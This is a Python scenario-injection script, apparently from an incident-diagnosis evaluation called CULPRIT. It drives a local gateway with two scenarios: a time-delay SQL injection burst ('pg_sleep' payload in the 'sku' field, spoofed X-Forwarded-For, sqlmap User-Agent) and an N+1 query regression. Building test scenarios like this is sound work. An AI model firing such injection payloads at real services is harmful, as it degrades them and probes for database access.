"""
scenarios.inject – Scenario injection runner for CULPRIT evaluations.

Scenario A (Exploit):
  Sends a fixed burst to POST /api/orders via gateway with a time-delay SQLi payload
  in `sku` from a single attacker IP.
  Payload: WIDGET-001' AND (SELECT 1 FROM pg_sleep(8)) IS NOT NULL; --
  Effect: Raises orders p95 latency to ~8s and generates attack log entries.

Scenario B (Regression):
  Shifts gateway weights to 100% blue (v1.5.0).
  Sends batch multi-item orders triggering N+1 unindexed inventory queries.
  Effect: Connection pool contention slows down both /api/orders and /api/products.
"""

import concurrent.futures
import json
import os
import sys
import threading
import time
from typing import Any, Dict, List
import requests

DEFAULT_GATEWAY_URL = os.environ.get("GATEWAY_URL", "http://localhost:8080")
_scenario_running = False
_worker_thread = None


def start_scenario_a(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    burst_count: int = 4,
    sleep_delay: int = 5,
    attacker_ip: str = "198.51.100.42",
) -> Dict[str, Any]:
    """Inject Scenario A: SQLi time-delay attack burst into Docker gateway."""
    global _scenario_running, _worker_thread
    _scenario_running = True
    print(f"[Scenario A] Sending exploit requests with {sleep_delay}s time-delay payload to {gateway_url}...")
    url = f"{gateway_url.rstrip('/')}/api/orders"
    sqli_payload = f"WIDGET-001' AND (SELECT 1 FROM pg_sleep({sleep_delay})) IS NOT NULL; --"
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": attacker_ip,
        "User-Agent": "sqlmap/1.7.2#stable",
    }
    body = {
        "customer_id": 1,
        "sku": sqli_payload,
        "qty": 1,
    }

    def _loop():
        while _scenario_running:
            try:
                requests.post(url, json=body, headers=headers, timeout=sleep_delay + 2)
            except Exception:
                pass
            time.sleep(1.0)

    # Fire initial burst concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=burst_count) as executor:
        for _ in range(burst_count):
            executor.submit(lambda: requests.post(url, json=body, headers=headers, timeout=sleep_delay + 2) if _scenario_running else None)

    if _worker_thread is None or not _worker_thread.is_alive():
        _worker_thread = threading.Thread(target=_loop, daemon=True)
        _worker_thread.start()

    return {
        "scenario": "a_exploit",
        "burst_count": burst_count,
        "sleep_delay": sleep_delay,
        "attacker_ip": attacker_ip,
        "status": "running",
    }


def start_scenario_b(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    num_requests: int = 15,
) -> Dict[str, Any]:
    """Inject Scenario B: 100% blue routing + multi-item N+1 order traffic."""
    global _scenario_running, _worker_thread
    _scenario_running = True
    print(f"[Scenario B] Shifting weights to 100% blue and generating heavy multi-item traffic...")
    admin_url = f"{gateway_url.rstrip('/')}/admin/weights"
    try:
        requests.post(admin_url, json={"blue": 100, "green": 0}, timeout=5)
    except Exception:
        pass

    orders_url = f"{gateway_url.rstrip('/')}/api/orders"
    products_url = f"{gateway_url.rstrip('/')}/api/products"

    skus = ["WIDGET-001", "WIDGET-002", "GADGET-001", "GADGET-002", "TOOL-001", "TOOL-002", "PART-001", "PART-002", "PART-003", "PART-004"]
    multi_items = [{"sku": s, "qty": 1} for s in skus]
    body = {
        "customer_id": 1,
        "sku": "WIDGET-001",
        "qty": 1,
        "items": multi_items,
    }

    def _loop_b():
        count = 0
        while _scenario_running:
            try:
                if count % 2 == 0:
                    requests.get(products_url, timeout=6)
                else:
                    requests.post(orders_url, json=body, timeout=10)
                count += 1
            except Exception:
                pass
            time.sleep(1.0)

    # Initial concurrent burst
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        for _ in range(4):
            executor.submit(lambda: requests.post(orders_url, json=body, timeout=8) if _scenario_running else None)

    if _worker_thread is None or not _worker_thread.is_alive():
        _worker_thread = threading.Thread(target=_loop_b, daemon=True)
        _worker_thread.start()

    return {
        "scenario": "b_regression",
        "requests_sent": num_requests,
        "status": "running",
    }


def reset_scenario(gateway_url: str = DEFAULT_GATEWAY_URL) -> Dict[str, Any]:
    """Reset gateway weights to 50/50 and remove all block rules."""
    global _scenario_running
    _scenario_running = False
    base = gateway_url.rstrip("/")
    try:
        requests.post(f"{base}/admin/weights", json={"blue": 50, "green": 50}, timeout=5)
        state = requests.get(f"{base}/admin/state", timeout=5).json()
        for rule in state.get("rules", []):
            requests.delete(f"{base}/admin/rules/{rule['id']}", timeout=5)
        for route in state.get("disabled_routes", []):
            requests.post(f"{base}/admin/enable", json={"route": route}, timeout=5)
    except Exception as exc:
        print(f"Reset warning: {exc}")
    return {"status": "reset", "weights": {"blue": 50, "green": 50}}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "a"
    gw = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_GATEWAY_URL
    if mode == "a":
        start_scenario_a(gw)
    elif mode == "b":
        start_scenario_b(gw)
    elif mode == "reset":
        reset_scenario(gw)
    else:
        print(f"Unknown mode: {mode}. Use 'a', 'b', or 'reset'")
